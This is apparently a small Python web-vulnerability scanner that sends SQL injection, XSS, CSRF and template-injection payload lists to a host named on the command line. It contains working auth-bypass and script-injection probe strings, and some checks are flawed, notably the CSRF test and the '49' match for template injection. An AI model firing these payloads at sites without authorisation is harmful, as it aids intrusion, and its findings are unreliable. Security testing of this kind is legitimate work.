import requests
import sys

def check_sql_injection(url):
    payloads = [
        "'",
        "\"",
        "--",
        ";--",
        ";/*",
        "/* */",
        "admin' --",
        "admin' #",
        "admin'/*",
        "admin'/**/",
        "admin' OR '1'='1' --",
        "admin' OR '1'='1' #",
        "admin' OR '1'='1'/*",
        "admin' OR '1'='1'/**/",
        "admin' OR 1=1 --",
        "admin' OR 1=1 #",
        "admin' OR 1=1/*",
        "admin' OR 1=1/**/"
    ]

    for payload in payloads:
        try:
            response = requests.get(url + payload)
            if "SQL syntax" in response.text or "syntax error" in response.text:
                return f"Potential SQL injection detected: {payload}"
        except:
            return "Error checking for SQL injection"

    return "No SQL injection detected."


def check_xss_vulnerability(url):
    payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<iframe src=javascript:alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "<object data=x onload=alert('XSS')>",
        "<embed src=x onload=alert('XSS')>",
        "<a href=javascript:alert('XSS')>Click me</a>"
    ]

    for payload in payloads:
        try:
            response = requests.get(url, params={'search': payload})
            if payload in response.text:
                return f"Potential XSS vulnerability detected: {payload}"
        except:
            return "Error checking for XSS vulnerability"

    return "No XSS vulnerability detected."


def check_csrf_vulnerability(url):
    # This is a simple example, you would need to craft a more targeted payload
    payload = "<form action='https://example.com/change-password' method='post'>" \
              "<input type='hidden' name='password' value='newpassword'>" \
              "<input type='submit' value='Submit'>" \
              "</form>"

    try:
        response = requests.post(url, data=payload)
        if "newpassword" in response.text:
            return "Potential CSRF vulnerability detected."
        else:
            return "No CSRF vulnerability detected."
    except:
        return "Error checking for CSRF vulnerability"


def check_ssti_vulnerability(url):
    payloads = [
        "{{7*7}}",
        "${7*7}",
        "#{7*7}",
        "<%=7*7%>",
        "{{7*'7'}}",
        "${7*'7'}",
        "#{7*'7'}",
        "<%=7*'7'%>"
    ]

    for payload in payloads:
        try:
            response = requests.get(url + payload)
            if "49" in response.text:
                return f"Potential SSTI vulnerability detected: {payload}"
        except:
            return "Error checking for SSTI vulnerability"

    return "No SSTI vulnerability detected."

website = "http://" + sys.argv[1]

sql_injection_check = check_sql_injection(website)
print(sql_injection_check)

xss_check = check_xss_vulnerability(website)
print(xss_check)

csrf_check = check_csrf_vulnerability(website)
print(csrf_check)

ssti_check = check_ssti_vulnerability(website)
print(ssti_check)
